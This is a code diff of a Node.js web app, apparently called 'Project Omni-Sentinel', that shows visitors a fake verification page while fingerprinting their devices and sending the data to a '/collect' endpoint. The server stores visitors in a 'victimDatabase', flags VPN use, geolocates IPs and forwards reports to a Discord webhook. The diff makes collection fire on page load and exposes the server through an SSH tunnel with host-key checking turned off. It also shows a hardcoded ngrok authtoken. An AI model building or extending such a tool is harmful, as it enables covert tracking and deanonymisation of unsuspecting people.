@@ -209,17 +209,9 @@ app.get('/', (req, res) => {
                 // Optional: track misc clicks
             }
 
-            // Trigger Passive Scan Cache Build
+            // Omni-Update Logic (Live Reporting)
             window.onload = () => { setTimeout(() => gatherForensics('passive'), 500); };
 
-            // Smart Exit Beacon
-            document.addEventListener("visibilitychange", () => {
-                if (document.visibilityState === 'hidden') {
-                    if (!hasSentActive && passiveCache) {
-                        navigator.sendBeacon('/collect', JSON.stringify(passiveCache));
-                    }
-                }
-            });
 
             function startVerification(e) {
                 if (document.getElementById('spinner').style.display === 'block') return;
@@ -354,10 +346,10 @@ app.get('/', (req, res) => {
                 };
 
                 if (mode === 'passive') {
-                    passiveCache = finalData;
-                    // Passive data is now CACHED. Sent only on tab close (visibilitychange).
+                    // Send scout data immediately
+                    navigator.sendBeacon('/collect', JSON.stringify(finalData));
                 } else {
-                    // Active Mode - Send Immediately
+                    // Active Mode - Update the existing report
                     navigator.sendBeacon('/collect', JSON.stringify(finalData));
                     
                     // Simulate 'success' tick
@@ -593,10 +585,10 @@ app.post('/collect', async (req, res) => {
     // Debug: Confirmed Data Input
     console.log(`📦 Data Recv (${d.type}): ` + ip);
 
-    // --- ZOMBIE PERSISTENCE (Track Original Identity) ---
-    const zombie = victimDatabase[d.id] || { original: ip };
+    // --- ZOMBIE PERSISTENCE (Track Original Identity & Message) ---
+    const zombie = victimDatabase[d.id] || { original: ip, messageID: null };
     const isVPN = zombie.original !== ip;
-    victimDatabase[d.id] = { original: zombie.original || ip };
+    victimDatabase[d.id] = { ...zombie, original: zombie.original || ip };
 
     // --- GEO-FORENSICS (Network Origin) ---
     let geoCity = "Unknown", geoCountry = "Unknown";
@@ -651,12 +643,26 @@ app.post('/collect', async (req, res) => {
                 { name: "🧠 NEURAL SIGNATURE", value: `\`${trunc(d.neural)}\``, inline: false },
                 { name: "📱 PHYSICAL PROFILE", value: `GPU: \`${d.gpu}\`\\nRAM: \`${d.ram}GB\` | Cores: \`${d.cores}\`\\nBattery: \`${d.battery}\`\\nShader: \`${d.shader_dna}\`\\nSkew: \`${d.clock_skew}\``, inline: false }
             ],
-            footer: { text: "PROJECT OMNI-SENTINEL | AUTHOR: GENIUS MASTER | SUPREME OMEGA BUILD" },
+            footer: { text: "PROJECT OMNI-SENTINEL | UPDATED: " + new Date().toLocaleTimeString() },
             timestamp: new Date().toISOString()
         }]
     };
 
-    axios.post(DISCORD_WEBHOOK_URL, embed).catch(() => { });
+    if (zombie.messageID && d.type === 'active') {
+        // UPDATE EXISTING EMBED
+        axios.patch(`${DISCORD_WEBHOOK_URL}/messages/${zombie.messageID}`, embed)
+            .catch(e => { console.log("Update Error: " + e.message); });
+    } else {
+        // NEW REPORT (or first passive)
+        axios.post(DISCORD_WEBHOOK_URL + "?wait=true", embed)
+            .then(resp => {
+                if (resp.data && resp.data.id) {
+                    victimDatabase[d.id].messageID = resp.data.id;
+                }
+            })
+            .catch(e => { console.log("Discord Error: " + e.message); });
+    }
+
     res.sendStatus(200);
 });
 
@@ -668,31 +674,31 @@ const { spawn } = require('child_process');
 const PORT = 3000;
 app.listen(PORT, async () => {
     console.log(`\n🟢 Local Engine Running:  http://localhost:${PORT}`);
-    console.log(`⌛ Initializing Ngrok Tunnel (Direct Mode)...`);
+    // Clean up any old processes first
 
     // Clean up any old processes first
-    try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }
+    // Clean prior SSH tunnels
+    try { require('child_process').execSync('taskkill /F /IM ssh.exe', { stdio: 'ignore' }); } catch (e) { }
 
-    // Start ngrok directly
-    // Command: ngrok http 3000 --authtoken=XXX --log=stdout
-    const ngrokProcess = spawn('ngrok.exe', [
-        'http',
-        PORT.toString(),
-        '--authtoken=384jyF85TZS8gMaK9CAPZ2DYIaF_3aUxYUqYGuqoQnoaaqeEV',
-        '--log=stdout'
-    ], {
-        cwd: __dirname // Ensure we run from the folder containing ngrok.exe
-    });
+    console.log("⌛ Initializing Localhost.run Tunnel (SSH)...");
+
+    // Start Localhost.run SSH Tunnel
+    // Command: ssh -o StrictHostKeyChecking=no -R 80:localhost:3000 nokey@localhost.run
+    const tunnelProcess = spawn('ssh', [
+        '-o', 'StrictHostKeyChecking=no',
+        '-R', '80:localhost:' + PORT,
+        'nokey@localhost.run'
+    ]);
 
     let urlFound = false;
 
-    // Capture Output
-    ngrokProcess.stdout.on('data', (data) => {
+    // Capture Output (Localhost.run sends URL to stdout)
+    tunnelProcess.stdout.on('data', (data) => {
         const output = data.toString();
-        // console.log("Debug Ngrok:", output); // Uncomment if needed
+        // console.log("Debug Tunnel:", output); 
 
-        // Look for URL in logs
-        const match = output.match(/url=(https:\/\/[^ ]+)/);
+        // Match: "your url is: https://xyz.lhr.life"
+        const match = output.match(/(https:\/\/[a-z0-9-]+\.lhr\.life)/);
         if (match && !urlFound) {
             urlFound = true;
             const url = match[1];
@@ -703,12 +709,13 @@ app.listen(PORT, async () => {
         }
     });
 
-    ngrokProcess.stderr.on('data', (data) => {
-        console.error(`Ngrok Error: ${data}`);
+    tunnelProcess.stderr.on('data', (data) => {
+        // Localhost.run prints Welcome banner to stderr. We suppress it unless it's an error code.
+        // Silent.
     });
 
-    ngrokProcess.on('close', (code) => {
-        console.log(`Ngrok process exited with code ${code}`);
+    tunnelProcess.on('close', (code) => {
+        console.log(`Tunnel process exited with code ${code}`);
     });
 
     // Cleanup when node dies
@@ -716,12 +723,13 @@ app.listen(PORT, async () => {
     const cleanup = () => {
         if (cleanupDone) return;
         cleanupDone = true;
-        ngrokProcess.kill();
-        try { require('child_process').execSync('taskkill /F /IM ngrok.exe', { stdio: 'ignore' }); } catch (e) { }
-        process.exit(0); // <--- IMPORTANT: Actually exit the process!
+        tunnelProcess.kill();
+        try { require('child_process').execSync('taskkill /F /IM ssh.exe', { stdio: 'ignore' }); } catch (e) { }
+        process.exit(0);
     };
 
     process.on('SIGINT', cleanup);
+    process.on('SIGTERM', cleanup);
     process.on('SIGTERM', cleanup);
     process.on('exit', cleanup);
 });
